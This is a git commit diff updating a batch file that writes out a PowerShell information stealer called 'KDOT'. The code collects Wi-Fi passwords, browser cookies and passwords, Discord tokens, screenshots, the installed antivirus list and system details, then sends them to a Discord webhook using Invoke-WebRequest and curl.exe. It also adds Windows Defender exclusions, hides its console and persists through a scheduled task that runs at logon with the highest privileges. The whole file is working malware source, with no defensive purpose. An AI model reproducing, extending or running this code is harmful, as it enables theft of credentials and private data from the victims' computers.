b800415f4c7f9200b905a83bb53de86003e8a2f8
kdot227 <damndc227@gmail.com>
2023-04-19 16:13:58 -0500

    add update to bat file

--- main.bat
+++ main.bat
@@ -10,9 +10,10 @@ if %errorlevel% == 0 (
 :admin
 
 echo function CHECK_IF_ADMIN { > powershell123.ps1
-echo $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator); echo $test >> powershell123.ps1
+echo $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator) >> powershell123.ps1
+echo return $test >> powershell123.ps1
 echo } >> powershell123.ps1
-echo function EXFILTRATE-DATA { >> powershell123.ps1
+echo function Invoke-Extraction { >> powershell123.ps1
 echo $webhook = "YOUR_WEBHOOK_HERE" >> powershell123.ps1
 echo $ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing >> powershell123.ps1
 echo $ip = $ip.Content >> powershell123.ps1
@@ -30,21 +31,28 @@ echo $fulldiskinfo ^> $env:temp\DiskInfo.txt >> powershell123.ps1
 echo $gpu = (Get-WmiObject Win32_VideoController).Name >> powershell123.ps1
 echo $gpu ^> $env:LOCALAPPDATA\Temp\GPU.txt >> powershell123.ps1
 echo $format = " GB" >> powershell123.ps1
-echo $total = Get-CimInstance Win32_PhysicalMemory ^| Measure-Object -Property capacity -Sum ^| Foreach {"{0:N2}" -f ([math]::round(($_.Sum / 1GB),2))} >> powershell123.ps1
+echo $total = Get-CimInstance Win32_PhysicalMemory ^| Measure-Object -Property capacity -Sum ^| Foreach-Object {"{0:N2}" -f ([math]::round(($_.Sum / 1GB),2))} >> powershell123.ps1
 echo $raminfo = "$total" + "$format" >> powershell123.ps1
-echo $mac = Get-WmiObject win32_networkadapterconfiguration ^| select description, macaddress >> powershell123.ps1
+echo $mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME ^| Where-Object{$_.IpEnabled -Match "True"} ^| Select-Object -Expand macaddress) -join "," >> powershell123.ps1
 echo $mac ^> $env:LOCALAPPDATA\Temp\mac.txt >> powershell123.ps1
 echo $username = $env:USERNAME >> powershell123.ps1
 echo $hostname = $env:COMPUTERNAME >> powershell123.ps1
-echo $netstat = netstat -ano ^> $env:LOCALAPPDATA\Temp\netstat.txt >> powershell123.ps1
-echo $wifipasslist = netsh wlan show profiles ^| Select-String "\:(.+)$" ^| %%{$name=$_.Matches.Groups[1].Value.Trim(); $_} ^| %%{(netsh wlan show profile name="$name" key=clear)}  ^| Select-String "Key Content\W+\:(.+)$" ^| %%{$pass=$_.Matches.Groups[1].Value.Trim(); $_} ^| %%{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} ^| out-string >> powershell123.ps1
+echo netstat -ano ^> $env:LOCALAPPDATA\Temp\netstat.txt >> powershell123.ps1
+echo # List of Installed AVs >> powershell123.ps1
+echo function get-installed-av { >> powershell123.ps1
+echo $wmiQuery = "SELECT * FROM AntiVirusProduct" >> powershell123.ps1
+echo $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery  @psboundparameters >> powershell123.ps1
+echo $AntivirusProduct.displayName >> powershell123.ps1
+echo } >> powershell123.ps1
+echo $avlist = get-installed-av -autosize ^| Format-Table ^| out-string >> powershell123.ps1
+echo $wifipasslist = netsh wlan show profiles ^| Select-String "\:(.+)$" ^| ForEach-Object{$_.Matches.Groups[1].Value.Trim(); $_} ^| ForEach-Object{(netsh wlan show profile name="$name" key=clear)}  ^| Select-String "Key Content\W+\:(.+)$" ^| ForEach-Object{$_.Matches.Groups[1].Value.Trim(); $_} ^| ForEach-Object{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} ^| out-string >> powershell123.ps1
 echo $wifi = $wifipasslist ^| out-string >> powershell123.ps1
 echo $wifi ^> $env:temp\WIFIPasswords.txt >> powershell123.ps1
 echo Get-CimInstance Win32_StartupCommand ^| Select-Object Name, command, Location, User ^| Format-List ^> $env:temp\StartUpApps.txt >> powershell123.ps1
-echo Get-WmiObject win32_service ^|? State -match "running" ^| select Name, DisplayName, PathName, User ^| sort Name ^| ft -wrap -autosize ^>  $env:LOCALAPPDATA\Temp\running-services.txt >> powershell123.ps1
-echo Get-WmiObject win32_process ^| Select-Object Name,Description,ProcessId,ThreadCount,Handles,Path ^| ft -wrap -autosize ^> $env:temp\running-applications.txt >> powershell123.ps1
+echo Get-WmiObject win32_service ^|Where-Object State -match "running" ^| Select-Object Name, DisplayName, PathName, User ^| Sort-Object Name ^| Format-Table -wrap -autosize ^>  $env:LOCALAPPDATA\Temp\running-services.txt >> powershell123.ps1
+echo Get-WmiObject win32_process ^| Select-Object Name,Description,ProcessId,ThreadCount,Handles,Path ^| Format-Table -wrap -autosize ^> $env:temp\running-applications.txt >> powershell123.ps1
 echo Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* ^| Select-Object DisplayName, DisplayVersion, Publisher, InstallDate ^| Format-Table ^> $env:temp\Installed-Applications.txt >> powershell123.ps1
-echo Get-NetAdapter ^| ft Name,InterfaceDescription,PhysicalMediaType,NdisPhysicalMedium -AutoSize ^> $env:temp\NetworkAdapters.txt >> powershell123.ps1
+echo Get-NetAdapter ^| Format-Table Name,InterfaceDescription,PhysicalMediaType,NdisPhysicalMedium -AutoSize ^> $env:temp\NetworkAdapters.txt >> powershell123.ps1
 echo $ProductKey >> powershell123.ps1
 echo Get-ProductKey ^> $env:localappdata\temp\ProductKey.txt >> powershell123.ps1
 echo Add-Type -AssemblyName System.Windows.Forms,System.Drawing >> powershell123.ps1
@@ -57,7 +65,7 @@ echo $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height) >> 
 echo $bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height) >> powershell123.ps1
 echo $graphics = [Drawing.Graphics]::FromImage($bmp) >> powershell123.ps1
 echo $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size) >> powershell123.ps1
-echo $bmp.Save("$env:localappdata\temp\desktop-screenshot.png") >> powershell123.ps1
+echo $bmp.Save("$env:localappdata\temp\screenshot.png") >> powershell123.ps1
 echo $graphics.Dispose() >> powershell123.ps1
 echo $bmp.Dispose() >> powershell123.ps1
 echo $embed_and_body = @{ >> powershell123.ps1
@@ -90,6 +98,10 @@ echo "name" = ":bust_in_silhouette: User Information" >> powershell123.ps1
 echo "value" = "``````Date: $date `nLanguage: $lang `nUsername: $username `nHostname: $hostname``````" >> powershell123.ps1
 echo }, >> powershell123.ps1
 echo @{ >> powershell123.ps1
+echo "name" = ":shield: Antivirus" >> powershell123.ps1
+echo "value" = "``````$avlist``````" >> powershell123.ps1
+echo }, >> powershell123.ps1
+echo @{ >> powershell123.ps1
 echo "name" = ":computer: Hardware" >> powershell123.ps1
 echo "value" = "``````OS: $osversion `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac``````" >> powershell123.ps1
 echo }, >> powershell123.ps1
@@ -107,6 +119,8 @@ echo ) >> powershell123.ps1
 echo } >> powershell123.ps1
 echo $payload = $embed_and_body ^| ConvertTo-Json -Depth 10 >> powershell123.ps1
 echo Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing ^| Out-Null >> powershell123.ps1
+echo # Screenshot Embed >> powershell123.ps1
+echo curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **Screenshot**\`"}" -F "file=@\`"$env:localappdata\temp\screenshot.png\`"" $webhook ^| out-null >> powershell123.ps1
 echo Set-Location $env:LOCALAPPDATA\Temp >> powershell123.ps1
 echo $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" >> powershell123.ps1
 echo if ($token_prot -eq $true) { >> powershell123.ps1
@@ -132,7 +146,7 @@ echo Move-Item -Path "$extracted\mac.txt" -Destination "$extracted\KDOT\mac.txt"
 echo Move-Item -Path "$extracted\browser-cookies.txt" -Destination "$extracted\KDOT\browser-cookies.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
 echo Move-Item -Path "$extracted\browser-history.txt" -Destination "$extracted\KDOT\browser-history.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
 echo Move-Item -Path "$extracted\browser-passwords.txt" -Destination "$extracted\KDOT\browser-passwords.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
-echo Move-Item -Path "$extracted\desktop-screenshot.png" -Destination "$extracted\KDOT\desktop-screenshot.png" -ErrorAction SilentlyContinue >> powershell123.ps1
+echo Move-Item -Path "$extracted\screenshot.png" -Destination "$extracted\KDOT\screenshot.png" -ErrorAction SilentlyContinue >> powershell123.ps1
 echo Move-Item -Path "$extracted\tokens.txt" -Destination "$extracted\KDOT\tokens.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
 echo Move-Item -Path "$extracted\WIFIPasswords.txt" -Destination "$extracted\KDOT\WIFIPasswords.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
 echo Move-Item -Path "$extracted\GPU.txt" -Destination "$extracted\KDOT\GPU.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
@@ -150,24 +164,22 @@ echo Remove-Item "$extracted\KDOT.zip" >> powershell123.ps1
 echo Remove-Item "$extracted\KDOT" -Recurse >> powershell123.ps1
 echo Remove-Item "$extracted\main.exe" >> powershell123.ps1
 echo } >> powershell123.ps1
-echo function TASKS { >> powershell123.ps1
-echo $test_KDOT = Test-Path -Path "$env:APPDATA\KDOT" >> powershell123.ps1
-echo if ($test_KDOT -eq $false) { >> powershell123.ps1
-echo try { >> powershell123.ps1
+echo function Invoke-TASKS { >> powershell123.ps1
 echo Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" >> powershell123.ps1
 echo Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT" >> powershell123.ps1
-echo } catch { >> powershell123.ps1
-echo Write-Host "Failed to add exclusions" >> powershell123.ps1
-echo } >> powershell123.ps1
 echo New-Item -ItemType Directory -Path "$env:APPDATA\KDOT" >> powershell123.ps1
 echo $origin = $PSCommandPath >> powershell123.ps1
 echo Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1" >> powershell123.ps1
-echo } >> powershell123.ps1
 echo $scriptPath = "$env:APPDATA\KDOT\KDOT.ps1" >> powershell123.ps1
-echo $command = "powershell.exe -NonInteractive -NoProfile -Nologo -ExecutionPolicy Bypass -WindowStyle hidden -File `"$scriptPath`"" >> powershell123.ps1
-echo $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" >> powershell123.ps1
-echo New-ItemProperty -Path $regPath -Name "KDOT" -Value $command -PropertyType String -Force ^| Out-Null >> powershell123.ps1
-echo EXFILTRATE-DATA >> powershell123.ps1
+echo $batch_code = "powershell -ExecutionPolicy Bypass -File $scriptPath" >> powershell123.ps1
+echo $batch_path = "$env:APPDATA\KDOT\KDOT.bat" >> powershell123.ps1
+echo Set-Content -Path $batch_path -Value $batch_code -Encoding ASCII >> powershell123.ps1
+echo $task_name = "KDOT" >> powershell123.ps1
+echo $task_action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c $batch_path" >> powershell123.ps1
+echo $task_trigger = New-ScheduledTaskTrigger -AtLogOn >> powershell123.ps1
+echo $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable >> powershell123.ps1
+echo Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "KDOT" -RunLevel Highest -Force >> powershell123.ps1
+echo Invoke-Extraction >> powershell123.ps1
 echo } >> powershell123.ps1
 echo function diskdata { >> powershell123.ps1
 echo $disks = get-wmiobject Win32_LogicalDisk -computername "$env:computername" -Filter "DriveType = 3" >> powershell123.ps1
@@ -177,7 +189,7 @@ echo $volumename = $disk.volumename >> powershell123.ps1
 echo $totalspace = [math]::round($disk.size / 1GB, 2) >> powershell123.ps1
 echo $freespace = [math]::round($disk.freespace / 1GB, 2) >> powershell123.ps1
 echo $usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2) >> powershell123.ps1
-echo $disk ^| Select-Object @{n = "Letter"; e = { $letter } }, @{n = "Volume Name"; e = { $volumename } }, @{n = "Total (GB)"; e = { ($totalspace).tostring()}}, @{n = "Free (GB)"; e = { ($freespace).tostring()}}, @{n = "Used (GB)"; e = { ($usedspace).tostring()}} ^| FT >> powershell123.ps1
+echo $disk ^| Select-Object @{n = "Letter"; e = { $letter } }, @{n = "Volume Name"; e = { $volumename } }, @{n = "Total (GB)"; e = { ($totalspace).tostring()}}, @{n = "Free (GB)"; e = { ($freespace).tostring()}}, @{n = "Used (GB)"; e = { ($usedspace).tostring()}} ^| Format-Table >> powershell123.ps1
 echo } >> powershell123.ps1
 echo } >> powershell123.ps1
 echo function Get-ProductKey { >> powershell123.ps1
@@ -221,9 +233,10 @@ echo $null = [Console.Window]::ShowWindow($consolePtr, 0) >> powershell123.ps1
 echo } >> powershell123.ps1
 echo if (CHECK_IF_ADMIN -eq $true) { >> powershell123.ps1
 echo Hide-Console >> powershell123.ps1
-echo TASKS >> powershell123.ps1
+echo Invoke-TASKS >> powershell123.ps1
 echo } else { >> powershell123.ps1
 echo Write-Host ("Please run as admin!") -ForegroundColor Red >> powershell123.ps1
+echo Start-Sleep -s 5 >> powershell123.ps1
 echo Request-Admin >> powershell123.ps1
 echo } >> powershell123.ps1
 powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force
